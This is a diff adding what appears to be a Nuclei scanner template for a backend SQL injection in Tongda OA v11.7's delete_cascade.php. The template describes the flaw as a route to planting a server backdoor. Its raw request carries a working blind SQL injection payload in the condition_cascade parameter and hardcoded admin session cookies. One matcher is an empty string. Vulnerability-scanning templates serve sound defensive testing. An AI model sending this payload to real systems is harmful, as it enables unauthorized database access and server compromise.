@@ -1,0 +1,36 @@
+id: tongdaOA-v7-delete_cascade-sql-injection
+
+info:
+  name: 通达OA v11.7 delete_cascade.php 后台SQL注入
+  author: cnaq
+  severity: high
+  description: 通达OA v11.7后台存在SQL注入，可通过此漏洞写入恶意后门文件攻击目标服务器
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.7%20delete_cascade.php%20%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5.html
+  tags: tongdaOA,sql,injection
+
+requests:
+  - raw:
+      - |
+        GET /general/hr/manage/query/delete_cascade.php?condition_cascade=select%20if((substr(user(),1,1)=%27r%27),1,power(9999,99)) HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
+        Accept: */*
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Cookie: PHPSESSID=ehhrg55555b0tbrvugvmccdos4; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=27df985; hideTopbar=1
+
+        
+    
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - HTTP/1.1 200 OK
+      
+      - type: word
+        part: header
+        words:
+          - ''
